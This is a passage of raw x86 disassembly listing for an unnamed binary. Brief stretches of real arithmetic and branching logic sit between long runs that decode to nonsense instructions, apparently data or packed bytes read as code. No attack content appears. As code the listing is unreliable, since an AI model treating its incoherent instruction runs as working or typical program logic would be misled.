  40b8fb:	or     ecx,DWORD PTR [ebx-0x2fcc0383]
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x6bfc9905],cl
  40b949:	shl    BYTE PTR [eax+eiz*2-0x608f8f7d],1
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b93c
  40b954:	outs   dx,BYTE PTR ds:[esi]
  40b955:	cmp    eax,0x14b6531d
  40b95a:	or     ebx,DWORD PTR [edi]
  40b95c:	fdivrp st(5),st
  40b95e:	cmp    eax,0xd50d5c20
  40b963:	rol    DWORD PTR [ebx],1
  40b965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b966:	sahf   
  40b967:	xor    al,0x90
  40b969:	(bad)  
  40b96a:	cmp    eax,0x6e0d5a81
  40b96f:	ficom  DWORD PTR [edx-0x65]
  40b972:	stos   DWORD PTR es:[edi],eax
  40b973:	ins    DWORD PTR es:[edi],dx
  40b974:	int3   
  40b975:	fbstp  TBYTE PTR [edx-0x73]
  40b978:	and    dh,BYTE PTR [eax-0x5]
  40b97b:	int3   
  40b97c:	mov    edx,edi
  40b97e:	mov    ecx,0x96a7421b
  40b983:	mov    bl,0x79
  40b985:	test   eax,0x24b1a187
  40b98a:	sub    edx,DWORD PTR [edi+0x39]
  40b98d:	repz xor al,0x8a
  40b990:	push   esi
  40b991:	jl     0x40b9e1
  40b993:	retf   0xdf4c
  40b996:	rcl    BYTE PTR [edx-0x728e5c1],0x26
  40b99d:	rol    DWORD PTR [edx],0xfe
  40b9a0:	xchg   esp,eax
  40b9a1:	pop    edx
  40b9a2:	repnz dec esi
  40b9a4:	aas    
  40b9a5:	add    DWORD PTR [edx],esi
  40b9a7:	or     edx,DWORD PTR [ebp-0x3202eec3]
  40b9ad:	adc    al,0x51
  40b9af:	push   ebx
  40b9b0:	push   ss
  40b9b1:	in     eax,dx
  40b9b2:	mov    ds:0xa21ec3bb,al
  40b9b7:	les    edx,FWORD PTR [ebx]
  40b9b9:	push   ss
  40b9ba:	aaa    
  40b9bb:	mov    esi,0xf0867db9
  40b9c0:	loopne 0x40b95e
  40b9c2:	xchg   DWORD PTR [esi-0x22443adb],ebp
  40b9c8:	fist   WORD PTR [esi+0x11]
  40b9cb:	(bad)  
  40b9cc:	fdiv   QWORD PTR [ecx+0x72]
  40b9cf:	add    cl,BYTE PTR [edx]
  40b9d1:	(bad)  
  40b9d2:	cld    
  40b9d3:	pop    edx
  40b9d4:	dec    edx
  40b9d5:	fwait
  40b9d6:	test   ecx,eax
  40b9d8:	jo     0x40b97d
  40b9da:	adc    esp,DWORD PTR [ebp-0x3e]
  40b9dd:	jg     0x40ba1d
  40b9df:	xor    eax,0x52e1519d
  40b9e5:	jge    0x40b9d8
  40b9e7:	daa    
  40b9e8:	push   0xffffffe9
  40b9ea:	cmp    DWORD PTR [ecx],eax
  40b9ec:	inc    ecx
  40b9ed:	bswap  ecx
  40b9ef:	adc    ebp,DWORD PTR [ebp-0x58]
  40b9f2:	lods   al,BYTE PTR ds:[esi]
  40b9f3:	xchg   esp,eax
  40b9f4:	shr    ah,0x3a
  40b9f7:	mov    dl,0x5e
  40b9f9:	mov    esi,0x4f2a96c8
  40b9fe:	(bad)  
  40b9ff:	jne    0x40b98b
  40ba01:	sub    ah,BYTE PTR [eax+0x7e]
  40ba04:	pop    edx
  40ba05:	push   ss
  40ba06:	inc    ebx
  40ba07:	push   es
  40ba08:	in     eax,dx
  40ba09:	in     al,dx
  40ba0a:	(bad)  
  40ba0b:	sar    DWORD PTR [esi+esi*8-0x1f],1
  40ba0f:	add    eax,0x79eebc45
  40ba14:	rol    DWORD PTR [esi+0x2b],0x88
  40ba18:	std    
  40ba19:	fdiv   QWORD PTR [esi-0x6c5d7995]
  40ba1f:	xchg   bh,al
  40ba21:	adc    eax,0xc449d787
  40ba26:	pop    edx
  40ba27:	push   eax
  40ba28:	inc    edi
  40ba29:	sub    bh,dl
  40ba2b:	xchg   edi,eax
  40ba2c:	push   ecx
  40ba2d:	scas   al,BYTE PTR es:[edi]
  40ba2e:	(bad)  
  40ba2f:	repnz shl DWORD PTR [edx],0x6d
  40ba33:	jae    0x40bab1
  40ba35:	retf   0x199b
  40ba38:	mov    bl,0x53
  40ba3a:	repz dec esp
  40ba3c:	xor    DWORD PTR [eax+ebp*4-0x4e],edi
  40ba40:	mov    ah,0xbd
  40ba42:	push   eax
  40ba43:	or     DWORD PTR [edx],ebx
  40ba45:	xchg   esi,eax
  40ba46:	add    al,0x1c
  40ba48:	and    eax,DWORD PTR [edx]
  40ba4a:	or     bh,BYTE PTR [ecx+ebx*1-0x375afc0d]
  40ba51:	es pop ds
  40ba53:	push   0xffffffa4
  40ba55:	jae    0x40ba48
  40ba57:	scas   eax,DWORD PTR es:[edi]
  40ba58:	adc    edi,DWORD PTR [edi]
  40ba5a:	dec    edx
  40ba5b:	fisubr WORD PTR [ebx-0x36]
  40ba5e:	pop    ebx
  40ba5f:	dec    edx
  40ba60:	repz pusha 
  40ba62:	daa    
  40ba63:	fwait
  40ba64:	inc    ebp
  40ba65:	pop    ebp
  40ba66:	and    ebp,DWORD PTR [ecx+0x7391539]
  40ba6c:	(bad)  
  40ba6d:	arpl   bp,dx
  40ba6f:	out    dx,al
  40ba70:	dec    eax
  40ba71:	add    DWORD PTR [edi+ebp*4],0xcbf82f7a
  40ba78:	add    eax,DWORD PTR [edx-0x27353eb4]
  40ba7e:	xchg   edx,eax
  40ba7f:	ret    
  40ba80:	dec    ebx
  40ba81:	mov    ds:0xfd8f5834,al
  40ba86:	sbb    ecx,DWORD PTR [ecx-0x6a]
  40ba89:	adc    eax,edi
  40ba8b:	jo     0x40ba65
  40ba8d:	clc    
  40ba8e:	xor    al,0x5e
  40ba90:	test   BYTE PTR gs:0xc8225fda,dl
  40ba97:	sahf   
  40ba98:	jb     0x40ba68
  40ba9a:	sub    dh,BYTE PTR [edx-0x6e0d9915]
  40baa0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40baa2:	ret    
  40baa3:	and    DWORD PTR [ebx+0x36],ebx
  40baa6:	rol    DWORD PTR [edi],1
  40baa8:	hlt    
  40baa9:	daa    
  40baaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baab:	push   eax
  40baac:	imul   ebp,ebx,0x6b
  40baaf:	push   ss
  40bab0:	imul   edi,DWORD PTR [edx+edi*1],0x3a
  40bab4:	fist   DWORD PTR [edi-0x28]
  40bab7:	into   
  40bab8:	pop    ebp
  40bab9:	das    
  40baba:	xchg   ecx,eax
  40babb:	es push 0x152c26c8
  40bac1:	repz jb 0x40bad6
  40bac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bac5:	inc    edx
  40bac6:	retf   0x6b9
  40bac9:	jmp    0x40bb2c
  40bacb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bacc:	mov    bh,0x80
  40bace:	fwait
  40bacf:	push   edi
  40bad0:	test   DWORD PTR [ebx-0x7e],esi
  40bad3:	push   edi
  40bad4:	push   0xffffff91
  40bad6:	pusha  
  40bad7:	gs js  0x40bab3
  40bada:	mov    ebp,0x3362452e
  40badf:	mov    dh,0x75
  40bae1:	mov    BYTE PTR [esi-0x8da21b3],dh
  40bae7:	ja     0x40baa2
  40bae9:	aam    0x1c
  40baeb:	push   esp
  40baec:	sti    
  40baed:	adc    BYTE PTR [esp+edx*1-0x4355e840],cl
  40baf4:	retf   0xd578
  40baf7:	push   esi
  40baf8:	out    dx,al
  40baf9:	mov    esp,0xb15d0469
  40bafe:	mov    esi,0xd838adee
  40bb04:	or     al,0x4d
  40bb06:	(bad)  
  40bb07:	ss mov ch,0x79
  40bb0a:	and    BYTE PTR ds:0x5122717d,cl
  40bb10:	sub    BYTE PTR ds:[edi],ah
  40bb13:	jmp    0xc054:0xa2c028db
  40bb1a:	push   DWORD PTR [edx-0x5]
  40bb1d:	mov    bh,BYTE PTR [ebx+0x62]
  40bb20:	ins    BYTE PTR es:[edi],dx
  40bb21:	dec    ecx
  40bb22:	pop    ss
  40bb23:	sbb    eax,0x81b46524
  40bb28:	jno    0x40bb38
  40bb2a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb2c:	orps   xmm3,xmm6
  40bb2f:	ins    BYTE PTR es:[edi],dx
  40bb30:	dec    ecx
  40bb31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb32:	sbb    BYTE PTR [esi+0x3c],cl
  40bb35:	(bad)  
  40bb36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb37:	(bad)  
  40bb38:	fiadd  WORD PTR [edx+edx*2]
  40bb3b:	fcmovbe st,st(0)
  40bb3d:	jmp    0x40bb96
  40bb3f:	scas   al,BYTE PTR es:[edi]
  40bb40:	daa    
  40bb41:	in     al,dx
  40bb42:	ret    
  40bb43:	push   ds
  40bb44:	xchg   esi,eax
  40bb45:	aam    0xa8
  40bb47:	push   0x8c920ecd
  40bb4c:	sti    
  40bb4d:	mov    al,ds:0xb4508eab
  40bb52:	adc    ecx,ecx
  40bb54:	scas   eax,DWORD PTR es:[edi]
  40bb55:	sbb    DWORD PTR [eax],ecx
  40bb57:	mov    al,0x93
  40bb59:	repz pop es
  40bb5b:	jbe    0x40bb4e
  40bb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb5e:	into   
  40bb5f:	stos   BYTE PTR es:[edi],al
  40bb60:	mov    edx,0x74e5f19c
  40bb65:	push   eax
  40bb66:	mov    ebp,DWORD PTR [ebp-0x32cf7a62]
  40bb6c:	push   ebx
  40bb6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb6e:	(bad)  
  40bb6f:	inc    BYTE PTR [edx]
  40bb71:	loopne 0x40bbe9
  40bb73:	imul   esp,DWORD PTR [edx+0x34e24e5d],0xffffffd6
  40bb7a:	scas   eax,DWORD PTR es:[edi]
  40bb7b:	mov    ds:0x3b0621ef,al
  40bb80:	adc    al,0x59
  40bb82:	adc    BYTE PTR [ebp-0x10],dh
  40bb85:	mov    bl,0x1
  40bb87:	lods   eax,DWORD PTR ds:[esi]
  40bb88:	lahf   
  40bb89:	sub    DWORD PTR [edi+0x7],0x71b6d7de
  40bb90:	pushf  
  40bb91:	aas    
  40bb92:	mov    esi,0xc12baea4
  40bb97:	test   eax,0xf25c6c64
  40bb9c:	dec    ecx
  40bb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb9f:	test   DWORD PTR [ebx+0xb6df941],edx
  40bba5:	rcl    BYTE PTR [ecx-0xf],0xe
  40bba9:	loope  0x40bb46
  40bbab:	xor    al,0x9c
  40bbad:	inc    ebp
  40bbae:	jmp    0x40bc1e
  40bbb0:	mov    ebp,0x3b558677
  40bbb5:	mov    dh,0xc
  40bbb7:	mov    bl,0xd
  40bbb9:	aam    0x53
  40bbbb:	ins    BYTE PTR es:[edi],dx
  40bbbc:	xchg   ecx,eax
  40bbbd:	das    
  40bbbe:	pop    ss
  40bbbf:	les    edx,FWORD PTR [eax]
  40bbc1:	(bad)  
  40bbc2:	jns    0x40bbd1
  40bbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc5:	test   BYTE PTR [eax+0x57],0xcf
  40bbc9:	aam    0x1e
  40bbcb:	xchg   esp,eax
  40bbcc:	push   0x71
  40bbce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbcf:	ds jo  0x40bbf0
  40bbd2:	push   0xfffffff7
  40bbd4:	outs   dx,DWORD PTR ds:[esi]
  40bbd5:	fldlg2 
  40bbd7:	mov    ebp,0xa728a786
  40bbdc:	jle    0x40bc09
  40bbde:	dec    esp
  40bbdf:	push   eax
  40bbe0:	add    BYTE PTR [ebx],dh
  40bbe2:	jle    0x40bb6b
  40bbe4:	cld    
  40bbe5:	sub    DWORD PTR [esi-0x3],0x315e5959
  40bbec:	jne    0x40bb9d
  40bbee:	repnz cmp BYTE PTR [ebx],cl
  40bbf1:	adc    al,0x59
  40bbf3:	(bad)  
  40bbf4:	jns    0x40bbc5
  40bbf6:	je     0x40bc53
  40bbf8:	jecxz  0x40bc16
  40bbfa:	fld    QWORD PTR [edx-0x17f1638e]
  40bc00:	pop    esi
  40bc01:	xor    ebp,esp
  40bc03:	or     esi,DWORD PTR [edi]
  40bc05:	in     al,dx
  40bc06:	sbb    BYTE PTR [edx-0x1d32a655],bh
  40bc0c:	in     eax,dx
  40bc0d:	cmp    BYTE PTR [ebx-0x74c23588],cl
  40bc13:	mov    eax,0x7195c034
  40bc18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc19:	aas    
  40bc1a:	xchg   esi,eax
  40bc1b:	rcr    BYTE PTR [esi],cl
  40bc1d:	cdq    
  40bc1e:	push   eax
  40bc1f:	inc    eax
  40bc20:	ror    eax,1
  40bc22:	sahf   
  40bc23:	sub    al,0x41
  40bc25:	aas    
  40bc26:	adc    BYTE PTR [esp+edi*8+0x64],0xb9
  40bc2b:	cdq    
  40bc2c:	sbb    DWORD PTR [ecx+eiz*4+0x3c8ba5a],0x2e
  40bc34:	cwde   
  40bc35:	mov    edi,0x726ff515
  40bc3a:	mov    edi,ebx
  40bc3c:	jmp    0x1137e99d
  40bc41:	push   ebx
  40bc42:	ja     0x40bc9c
  40bc44:	adc    al,0x61
  40bc46:	fisttp WORD PTR [edx+0x72]
  40bc49:	adc    BYTE PTR ds:0x2608a055,dl
  40bc4f:	imul   ebx,DWORD PTR [edi+0x8],0xffffffe9
  40bc53:	aaa    
  40bc54:	mov    bl,0xc
  40bc56:	jecxz  0x40bc49
  40bc58:	icebp  
  40bc59:	repnz sub al,cl
  40bc5c:	push   edx
  40bc5d:	icebp  
  40bc5e:	(bad)
  40bc61:	add    edi,eax
  40bc63:	ss jle 0x40bc36
  40bc66:	loopne 0x40bc1c
  40bc68:	aaa    
  40bc69:	aas    
  40bc6a:	mov    DWORD PTR [ebx-0x11],ebx
  40bc6d:	push   ss
  40bc6e:	clc    
  40bc6f:	and    DWORD PTR [ebx+0x5ff2f86d],esp
  40bc75:	fmul   DWORD PTR ds:0x1e69e9cc
  40bc7b:	or     BYTE PTR [ebp-0x1d],cl
  40bc7e:	pop    ss
  40bc7f:	imul   ebp,DWORD PTR [ebp+0x56],0xffffffaa
  40bc83:	int3   
  40bc84:	push   eax
  40bc85:	sbb    eax,0xb5df7b27
  40bc8a:	loop   0x40bd04
  40bc8c:	dec    ecx
  40bc8d:	std    
  40bc8e:	xchg   ebp,eax
  40bc8f:	dec    ebx
  40bc90:	retf   0x7370
  40bc93:	fmul   DWORD PTR [ebp+0x1a]
  40bc96:	pop    edx
  40bc97:	xchg   edi,eax
  40bc98:	test   BYTE PTR [ecx],bh
  40bc9a:	push   ds
  40bc9b:	lods   eax,DWORD PTR ds:[esi]
  40bc9c:	jecxz  0x40bc7f
  40bc9e:	out    dx,eax
  40bc9f:	(bad)  
  40bca0:	loopne 0x40bd1e
  40bca2:	repnz inc esp
  40bca4:	mov    al,0x41
  40bca6:	or     DWORD PTR [edi],ecx
  40bca8:	shr    DWORD PTR [ebp-0x58],cl
  40bcab:	loopne 0x40bc8e
  40bcad:	adc    DWORD PTR [edi+0x6b23af74],esi
  40bcb3:	popa   
  40bcb4:	clc    
  40bcb5:	sbb    al,0xf0
  40bcb7:	stc    
  40bcb8:	ja     0x40bce1
  40bcba:	sbb    BYTE PTR [ebx+0x6ef67aa4],al
  40bcc0:	sub    ah,dh
  40bcc2:	xchg   esi,eax
  40bcc3:	xor    cl,BYTE PTR [ebx-0x5afcfc61]
  40bcc9:	imul   ecx,DWORD PTR [ebx-0x3c],0x93ffe41c
  40bcd0:	js     0x40bca2
  40bcd2:	and    edi,ecx
  40bcd4:	in     al,dx
  40bcd5:	fbstp  TBYTE PTR [ebp+0x30]
  40bcd8:	jge    0x40bcb8
  40bcda:	(bad)  
  40bcdb:	jne    0x40bcf2
  40bcdd:	xchg   esi,eax
  40bcde:	fnstsw WORD PTR [ebx+0x2b]
  40bce1:	outs   dx,DWORD PTR ds:[esi]
  40bce2:	xor    esi,edi
  40bce4:	pushf  
  40bce5:	(bad)  
  40bce6:	paddusw mm0,QWORD PTR [ebx]
  40bce9:	leave  
  40bcea:	dec    edi
  40bceb:	mov    cs:0x2ba2531b,eax
  40bcf1:	adc    eax,0x5d8b3071
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    dh,bl
  40bd3f:	adc    al,0x7c
  40bd41:	ror    DWORD PTR [edi-0x608f8f71],1
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bdae
  40bd4b:	push   edi
  40bd4c:	xor    edx,ebp
  40bd4e:	jb     0x40bd3e
  40bd50:	test   al,0x42
  40bd52:	and    BYTE PTR [esi+0x3572d389],0x85
  40bd59:	dec    ecx
  40bd5a:	lods   eax,DWORD PTR ds:[esi]
  40bd5b:	imul   ebx,esp,0xffffff9d
  40bd5e:	xlat   BYTE PTR ds:[ebx]
  40bd5f:	xchg   edx,eax
  40bd60:	xchg   BYTE PTR [ebx-0x7b98b397],bh
  40bd66:	xchg   edi,eax
  40bd67:	mov    esi,0x27cbe2c3
  40bd6c:	lods   al,BYTE PTR ds:[esi]
  40bd6d:	rcl    BYTE PTR [edi-0x17],cl
  40bd70:	outs   dx,DWORD PTR ds:[esi]
  40bd71:	cwde   
  40bd72:	mov    ch,0xfc
  40bd74:	mov    cl,0x62
  40bd76:	icebp  
  40bd77:	aas    
  40bd78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd79:	xchg   BYTE PTR [edx],dl
  40bd7b:	xlat   BYTE PTR ds:[ebx]
  40bd7c:	jle    0x40bd17
  40bd7e:	test   DWORD PTR [ebp+0xe],0x56091571
  40bd85:	outs   dx,BYTE PTR ds:[esi]
  40bd86:	xchg   edx,eax
  40bd87:	or     eax,0x8d5d302d
  40bd8c:	mov    bh,0x6
  40bd8e:	imul   ecx,DWORD PTR [ebx],0xfffffff9
  40bd91:	iret   
  40bd92:	cmp    DWORD PTR [edx],ebp
  40bd94:	jno    0x40bdfb
  40bd96:	out    0xa7,al
  40bd98:	mov    al,0x6b
  40bd9a:	jp     0x40bd99
  40bd9c:	pop    es
  40bd9d:	jns    0x40bd46
  40bd9f:	fst    QWORD PTR [ebx+0x1d]
  40bda3:	dec    edx
  40bda4:	shl    esi,1
  40bda6:	es aas 
  40bda8:	cmp    BYTE PTR [esi+0x2f],bh
  40bdab:	mov    edx,0xa64d4e3c
  40bdb0:	outs   dx,BYTE PTR ds:[esi]
  40bdb1:	aad    0x28
  40bdb3:	jg     0x40bdc0
  40bdb5:	shl    BYTE PTR [edi-0x23b0c4df],1
  40bdbb:	arpl   WORD PTR [edx],si
  40bdbd:	inc    ecx
  40bdbe:	push   ds
  40bdbf:	jge    0x40bd8d
  40bdc1:	int    0x57
  40bdc3:	mov    edi,0xc94afb10
  40bdc8:	js     0x40bdd5
  40bdca:	rol    DWORD PTR [esi-0x4c],1
  40bdcd:	inc    ebx
  40bdce:	not    BYTE PTR [edi]
  40bdd0:	push   ebp
  40bdd1:	out    dx,al
  40bdd2:	jmp    0x40be21
  40bdd4:	int    0xfc
  40bdd6:	inc    ebp
  40bdd7:	mov    ds:0xa48dfddc,al
  40bddc:	pop    edi
  40bddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdde:	loopne 0x40be01
  40bde0:	aaa    
  40bde1:	push   eax
  40bde2:	mov    eax,ds:0xc61a0719
  40bde7:	dec    eax
  40bde8:	jge    0x40be10
  40bdea:	and    eax,edi
  40bdec:	and    BYTE PTR [esi],ah
  40bdee:	dec    edx
  40bdef:	dec    edx
  40bdf0:	inc    edi
  40bdf1:	dec    ebp
  40bdf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdf3:	jnp    0x40bd7f
  40bdf5:	xor    eax,0xe38f8c2c
  40bdfa:	bound  edi,QWORD PTR [ecx+0x60]
  40bdfd:	mov    BYTE PTR [edi],cl
  40bdff:	fcomp  st(7)
  40be01:	mov    ds:0x1047b021,al
  40be06:	popf   
  40be07:	pop    edi
  40be08:	(bad)  [edi-0x5d]
  40be0b:	into   
  40be0c:	loope  0x40bd91
  40be0e:	(bad)  
  40be0f:	and    DWORD PTR [ebx+0x70648b2d],ebp
  40be15:	pop    ebx
  40be16:	cmp    DWORD PTR [ebp+0x1568d462],esp
  40be1c:	pop    edx
  40be1d:	(bad)  
  40be1e:	jle    0x40be68
  40be20:	test   DWORD PTR [ebx+0xa],edx
  40be23:	jle    0x40be20
  40be25:	sub    eax,DWORD PTR [esi-0x22]
  40be28:	fucomip st,st(3)
  40be2a:	xchg   ebp,eax
  40be2b:	inc    esi
  40be2c:	dec    esp
  40be2d:	out    0x1,eax
  40be2f:	(bad)  
  40be30:	push   0xffffff80
  40be32:	adc    cl,BYTE PTR [esi+esi*2-0x24c69c3a]
  40be39:	mov    eax,DWORD PTR cs:[eax]
  40be3c:	mov    eax,0x692a13d2
  40be41:	ins    BYTE PTR es:[edi],dx
  40be42:	cmp    dl,BYTE PTR [edx-0xe]
  40be45:	pushf  
  40be46:	mov    al,ds:0xe0ced2e2
  40be4b:	cmc    
  40be4c:	push   0xa7a6c2f2
  40be51:	lock jp 0x40be82
  40be54:	push   esp
  40be55:	cs fcmovnb st,st(2)
  40be58:	test   BYTE PTR [edi-0x5a974ceb],ah
  40be5e:	ins    BYTE PTR es:[edi],dx
  40be5f:	cmp    edi,DWORD PTR [ebx+0x7b]
  40be62:	call   0xd4c4c564
  40be67:	dec    ecx
  40be68:	ja     0x40be12
  40be6a:	add    al,0x23
  40be6c:	dec    ebx
  40be6d:	jmp    0x40be38
  40be6f:	sub    ecx,DWORD PTR [edx-0x47d7cef7]
  40be75:	sahf   
  40be76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be77:	dec    esp
  40be78:	cdq    
  40be79:	mov    ecx,0xd9b716fd
  40be7e:	in     eax,dx
  40be7f:	sub    BYTE PTR [esi],cl
  40be81:	mov    ecx,0x91f073ac
  40be86:	les    edi,FWORD PTR [eax-0x1e]
  40be89:	mov    ebx,0xe0be0307
  40be8e:	or     DWORD PTR [edx+ecx*4+0x5f],esi
  40be92:	push   esp
  40be93:	sbb    BYTE PTR [edi],0x16
  40be96:	and    al,0x1
  40be98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be99:	xchg   ebp,eax
  40be9a:	ror    BYTE PTR ds:0x477949c1,0x38
  40bea1:	pop    DWORD PTR ds:0x1a07bb43
  40bea7:	aas    
  40bea8:	ja     0x40be6f
  40beaa:	ret    0xc742
  40bead:	lods   al,BYTE PTR ds:[esi]
  40beae:	push   DWORD PTR [edi]
  40beb0:	xchg   ebx,eax
  40beb1:	mov    bh,0x28
  40beb3:	add    eax,0xf426f372
  40beb8:	push   ecx
  40beb9:	dec    ebp
  40beba:	(bad)  
  40bebb:	call   0xec00d736
  40bec0:	and    esp,DWORD PTR [ecx]
  40bec2:	pusha  
  40bec3:	aas    
  40bec4:	adc    al,0x33
  40bec6:	(bad)  
  40bec7:	mov    dh,0xdc
  40bec9:	push   0xd4343c81
  40bece:	jle    0x40bed4
  40bed0:	adc    eax,0x5d162c5d
  40bed5:	push   0xffffff97
  40bed7:	inc    esi
  40bed8:	clc    
  40bed9:	sar    BYTE PTR ds:0x4bfe4292,0x5
  40bee0:	cdq    
  40bee1:	cmp    ebx,esp
  40bee3:	pop    ebp
  40bee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bee5:	das    
  40bee6:	pop    esp
  40bee7:	or     ebx,DWORD PTR [esi+0x576bd3c0]
  40beed:	push   ecx
  40beee:	push   cs
  40beef:	inc    eax
  40bef0:	inc    eax
  40bef1:	or     BYTE PTR [ebp-0x2f],cl
  40bef4:	add    edi,edi
  40bef6:	mov    dh,0xfa
  40bef8:	push   ebx
  40bef9:	cmp    al,0x50
  40befb:	fldenv [ecx+0x74]
  40befe:	push   cs
  40beff:	hlt    
  40bf00:	lods   al,BYTE PTR ds:[esi]
  40bf01:	aam    0xdd
  40bf03:	into   
  40bf04:	test   BYTE PTR [ebx-0x1f80386],al
  40bf0a:	es addr16 jb 0x40bf19
  40bf0e:	sub    al,0xcd
  40bf10:	xchg   edi,eax
  40bf11:	mov    bl,0x8a
  40bf13:	mov    ebx,0xb81a7c49
  40bf18:	xor    eax,0x865f5a2a
  40bf1d:	inc    edi
  40bf1e:	fiadd  WORD PTR [edi+0x26]
  40bf21:	adc    BYTE PTR cs:0x7617eead,bh
  40bf28:	xor    BYTE PTR [ebx-0x4b],cl
  40bf2b:	not    dl
  40bf2d:	stos   DWORD PTR es:[edi],eax
  40bf2e:	xchg   edx,eax
  40bf2f:	mov    ah,0xd4
  40bf31:	(bad)  
  40bf32:	scas   al,BYTE PTR es:[edi]
  40bf33:	imul   ecx,ecx,0x618e41e2
  40bf39:	mov    ch,0x90
  40bf3b:	cmp    eax,0xf225e590
  40bf40:	stos   BYTE PTR es:[edi],al
  40bf41:	mov    ebp,0x62099d35
  40bf46:	icebp  
  40bf47:	push   edi
  40bf48:	mov    dh,BYTE PTR [edi+0x51]
  40bf4b:	jno    0x40bf80
  40bf4d:	call   0xc527:0x4f6854e3
  40bf54:	adc    DWORD PTR [eax-0x74a861b8],eax
  40bf5a:	ds test al,0x2
  40bf5d:	clc    
  40bf5e:	scas   eax,DWORD PTR es:[edi]
  40bf5f:	popf   
  40bf60:	sub    ch,dh
  40bf62:	mov    eax,ds:0xfcd9ec47
  40bf67:	sahf   
  40bf68:	add    bl,ch
  40bf6a:	imul   ebx,DWORD PTR [edi-0x64c8e227],0xeace16bc
  40bf74:	data16 and al,0x3f
  40bf77:	stos   BYTE PTR es:[edi],al
  40bf78:	ret    
  40bf79:	sub    al,0xa7
  40bf7b:	mov    WORD PTR [esi+ecx*2],es
  40bf7e:	loopne 0x40bf67
  40bf80:	div    DWORD PTR [edi+edx*1+0x8]
  40bf84:	pop    edx
  40bf85:	inc    edx
  40bf86:	aaa    
  40bf87:	dec    ebp
  40bf88:	(bad)  
  40bf89:	enter  0x125,0xc8
  40bf8d:	ror    DWORD PTR [eax-0x26ce3043],0x72
  40bf94:	outs   dx,DWORD PTR ds:[esi]
  40bf95:	pop    ebp
  40bf96:	xchg   edx,eax
  40bf97:	push   0x2debd743
  40bf9c:	ficomp DWORD PTR [esp+edx*8+0x34]
  40bfa0:	adc    eax,DWORD PTR [ebp-0x51c1a928]
  40bfa6:	test   eax,0x22c5bd58
  40bfab:	shr    BYTE PTR [esi+0x13],0xac
  40bfaf:	daa    
  40bfb0:	adc    BYTE PTR [ebx-0x3ca3c92],bl
  40bfb6:	push   ds
  40bfb7:	xor    BYTE PTR [edi-0x7f],dh
  40bfba:	mov    esi,0x66906f84
  40bfbf:	jb     0x40c006
  40bfc1:	push   ebp
  40bfc2:	aam    0xa3
  40bfc4:	test   al,0x9d
  40bfc6:	in     al,0xee
  40bfc8:	push   0x92f94971
  40bfcd:	pop    ebx
  40bfce:	(bad)  
  40bfcf:	push   edi
  40bfd0:	repz jge 0x40bfc3
  40bfd3:	push   0xffffffe2
  40bfd5:	lods   eax,DWORD PTR ds:[esi]
  40bfd6:	jge    0x40bff5
  40bfd8:	sub    eax,0xee24006e
  40bfdd:	jno    0x40bfcc
  40bfdf:	sub    eax,0x44887f88
  40bfe4:	ins    BYTE PTR es:[edi],dx
  40bfe5:	jno    0x40bfb0
  40bfe7:	nop
  40bfe8:	push   es
  40bfe9:	jnp    0x40bfbc
  40bfeb:	pop    ds
  40bfec:	stc    
